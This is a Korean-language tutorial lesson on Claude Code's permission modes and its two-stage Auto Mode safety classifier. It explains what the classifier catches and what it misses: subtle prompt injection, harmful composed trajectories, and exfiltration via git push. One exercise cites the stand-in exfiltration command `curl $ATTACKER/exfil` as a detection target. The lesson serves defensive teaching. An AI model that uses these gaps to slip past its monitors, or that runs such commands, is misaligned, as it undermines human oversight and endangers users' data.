# 자율 에이전트로서의 Claude Code: 권한 모드 및 자동 모드

> Claude Code는 7가지 권한 모드를 제공한다. "plan"은 모든 작업 전에 묻고, "default"는 위험한 작업에 대해서만 묻고, "acceptEdits"는 파일 쓰기를 자동 승인하지만 셸 실행은 여전히 확인하며, "bypassPermissions"는 모든 것을 승인한다. Auto Mode(2026년 3월 24일)는 작업별 승인을 2단계 병렬 안전 분류기로 대체한다: 단일 토큰 빠른 검사가 모든 작업에서 실행되고; 플래그된 작업은 사고 사슬 심층 검토를 시작한다. 작업 예산은 `max_turns` 및 `max_budget_usd`를 통해 적용된다. Auto Mode는 연구 미리보기로 출시되었다 — Anthropic은 분류기만으로는 충분하지 않다고 명시적으로 밝혔다.

**Type:** 학습
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (장기 실행 에이전트), Phase 15 · 09 (코딩 에이전트 현황)
**Time:** ~45분

## 문제

머신에서의 자율 코딩 에이전트는 별개의 보안 카테고리다. 공격 표면은 에이전트가 닿을 수 있는 모든 것(파일 시스템, 네트워크, 자격 증명, 클립보드, 모든 브라우저 탭, 모든 열린 터미널)이다. Bruce Schneier와 다른 사람들은 이를 공개적으로 지적했다: 컴퓨터 사용 에이전트는 챗봇의 "기능 업데이트"가 아니라 새로운 종류의 도구이며 새로운 종류의 위험 프로필을 가지고 있다.

Claude Code의 권한 시스템은 Anthropic의 답변이다. 하나의 "자율/비자율" 스위치 대신, 역량 사다리에 걸친 7가지 모드가 있다: plan → default → acceptEdits → … → bypassPermissions. 각 모드는 속도와 작업별 검토 사이의 다른 트레이드오프다. Auto Mode(2026년 3월)는 분류기가 안전하다고 판단한 작업에 대해 사용자의 중요 경로에서 승인을 이동시키는 2단계 분류기를 추가하는 반면, 분류기가 플래그한 작업에 대해서는 검토 계층을 유지한다.

엔지니어링 질문: 이 시스템은 무엇을 잡아내고, 무엇을 놓치며, 주어진 작업에 실제로 어떤 모드가 적합한가?

## 개념

### 7가지 권한 모드

| 모드 | 동작 | 사용 시기 |
|---|---|---|
| `plan` | 에이전트가 계획 제안; 사용자가 전체 계획 승인; 모든 작업이 실행 전 검토됨 | 낯선 작업; 프로덕션 인접 코드; 저장소에서 에이전트를 처음 사용할 때 |
| `default` | 에이전트가 작업 실행; "위험한" 작업(셸 실행, 파괴적 작업, 네트워크 호출)에 대해 사용자에게 프롬프트 | 대부분의 대화형 코딩 세션 |
| `acceptEdits` | 파일 쓰기 자동 승인; 셸 실행 및 네트워크 호출은 여전히 프롬프트 | 여러 파일에 걸친 리팩토링 패스 |
| `acceptExec` | 선별된 허용 목록 내 셸 명령어 자동 승인; 쓰기 자동 승인 | 모든 셸 명령어가 `npm test`와 유사한 타이트한 내부 루프 |
| `autoMode` | 2단계 안전 분류기; 플래그된 작업이 검토로 상향 | 제약된 워크스페이스에서 장기 실행 무인 실행 |
| `yolo` | 대부분의 프롬프트 생략; 여전히 도구 허용/거부 목록 실행 | 일시적 샌드박스, CI 작업, 연구 스크립트 |
| `bypassPermissions` | 모든 것을 승인 | "버릴 의향이 있는 일시적 컨테이너 내에서만"으로 문서화됨 |

(위 이름은 공개 Claude Code 문서와 일치; "yolo"는 관대한 중간 지대의 비공식 약칭)

### Auto Mode 한 페이지

Auto Mode(2026년 3월 24일 출시)는 작업별 승인을 모델에 위임하는 첫 번째 권한 모드다. 구조:

1. **1단계 — 단일 토큰 분류기.** 모든 제안된 작업에서 실행된다. 저렴하다. "안전" 또는 "플래그"를 반환한다. 승인된 작업이 큐에 대기하지 않도록 메인 에이전트 루프와 병렬로 실행되도록 설계되었다.
2. **2단계 — 보조 정책/안전 검토.** 플래그된 작업에서만 실행된다. 작업, 세션의 현재 상태 및 선언된 작업에 대한 집중된 정책 및 안전 평가를 수행한다. 신뢰도가 낮으면 사용자 HITL로 상향한다.

예산 제어는 분류기와 함께 위치한다:

- `max_turns` — 세션의 총 반복 횟수.
- `max_budget_usd` — 세션을 중단하는 달러 상한.
- 도구당 작업 횟수 제한 (N번 이상의 `WebFetch` 호출 금지 등).

### 시스템이 잡아내는 것

- 알려진 위험한 작업 형태에 매핑되는 주입된 명령어가 있는 도구 입력으로의 직접적인 프롬프트 인젝션.
- 반복적인 도구 루프 — 분류기가 작업 N+1이 작업 N과 거의 동일하다는 것을 5번 연속으로 볼 수 있음.
- 그렇지 않으면 파일 편집 전용 세션에서 명백히 범위를 벗어난 셸 명령어.

### 시스템이 놓칠 수 있는 것

- **미묘한 프롬프트 인젝션** 단일 플래그된 작업을 생성하지 않고 행동을 조절하는 것. 간접 프롬프트 인젝션은 완전히 패치 가능한 취약점이 아니다(OpenAI 준비 책임자, 2025, 브라우저 에이전트에 대해 — 레슨 11 참조).
- **의미 수준의 잘못된 행동.** 모든 개별 작업은 안전해 보이지만 구성된 궤적은 해로울 수 있다. 분류기는 작업을 판단한다; 사용자의 의도를 재도출하지 않는다.
- **합법적 채널을 통한 유출.** 소유한 파일에 데이터를 쓴 다음 공개 저장소에 `git push`하는 것은 허용된 작업의 시퀀스이며, 그 구성이 문제다.

### 연구 미리보기 프레이밍

Anthropic은 Auto Mode를 연구 미리보기로 출시했다. 문서는 분류기가 계층이지 해결책이 아니라고 명시한다: 사용자는 Auto Mode를 예산, 허용 목록, 격리된 워크스페이스 및 궤적 감사와 결합할 것으로 예상된다(레슨 12-16). 미리보기 프레이밍은 또한 문서화된 평가-대-배포 격차(레슨 1)를 반영한다 — 오프라인 평가를 통과하는 분류기가 사용자의 맥락이 모호한 실제 세션에서 다르게 행동할 수 있다.

### 워크플로우에서 이 사다리의 위치

- 낯선 작업: `plan`에서 시작. 계획을 읽는 것이 잘못된 실행을 롤백하는 것보다 저렴하다.
- 알려진 리팩토링: `acceptEdits`가 많은 확인 클릭을 절약한다.
- 무인 백그라운드 실행: 폭발 반경을 측정한 워크스페이스 내에서만 `autoMode`(자격 증명 없음, 프로덕션 마운트 없음, 선택하지 않은 이그레스 없음).
- 일시적 컨테이너: `yolo`/`bypassPermissions`는 컨테이너와 그 자격 증명이 폐기 가능한 경우에만 허용된다.

## 사용하기

`code/main.py`는 2단계 분류기를 시뮬레이션한다. 1단계는 제안된 작업에 대한 저렴한 키워드 규칙이고, 2단계는 더 느린 다중 규칙 검토자다. 드라이버는 짧은 합성 궤적(안전한 작업, 프롬프트 인젝션 시도, 반복 루프)을 공급하고 분류기가 잡아내는 곳과 놓치는 곳을 보여준다.

## 출시하기

`outputs/skill-permission-mode-picker.md`는 작업 설명을 올바른 권한 모드, 예산 상한 및 필요한 격리와 일치시킨다.

## 연습문제

1. `code/main.py`를 실행하라. 어떤 합성 작업 유형이 1단계에서 플래그되지 않지만 2단계에서 항상 잡히는가? 어떤 것이 둘 다 잡히지 않는가?

2. 특정 알려진 나쁜 형태(예: `curl $ATTACKER/exfil`)를 잡기 위해 1단계 규칙 세트를 확장하라. 양성 작업 샘플에 대한 거짓 양성률을 측정하라.

3. Anthropic의 "에이전트 루프 작동 방식" 문서를 읽어라. `default` 모드에서 에이전트가 기본적으로 닿는 모든 외부 상태를 나열하라. `autoMode`를 무인으로 실행하기 전에 별도로 게이트해야 할 것은 무엇인가?

4. 24시간 무인 실행 예산을 설계하라: `max_turns`, `max_budget_usd`, 도구별 상한, 허용 목록. 각 숫자를 정당화하라.

5. 모든 개별 작업이 1단계와 2단계에서 승인되지만 구성된 행동이 잘못 정렬된 하나의 궤적을 설명하라. (레슨 14는 킬 스위치와 카나리 토큰이 이를 어떻게 해결하는지 다룬다.)

## 핵심 용어

| 용어 | 사람들이 말하는 것 | 실제 의미 |
|---|---|---|
| 권한 모드 (Permission mode) | "에이전트가 얼마나 많이 할 수 있는가" | 작업별 승인을 제어하는 7개의 명명된 정책 중 하나 |
| plan 모드 | "모든 것 전에 물어보기" | 에이전트가 계획 작성; 사용자가 실행 전 승인 |
| acceptEdits | "파일 쓰기 허용" | 파일 쓰기 자동 승인; 셸 실행은 여전히 프롬프트 |
| autoMode | "자동 승인" | 2단계 안전 분류기; 플래그된 작업 상향 |
| bypassPermissions | "완전 YOLO" | 모든 것 승인; 일시적 컨테이너용 |
| 1단계 분류기 (Stage 1 classifier) | "빠른 토큰 검사" | 제안된 작업에 대한 단일 토큰 규칙; 병렬 실행 |
| 2단계 분류기 (Stage 2 classifier) | "심층 검토" | 플래그된 작업에 대한 사고 사슬 추론 |
| 연구 미리보기 (Research preview) | "GA 아님" | 실패 모드가 아직 매핑 중인 기능에 대한 Anthropic 프레이밍 |
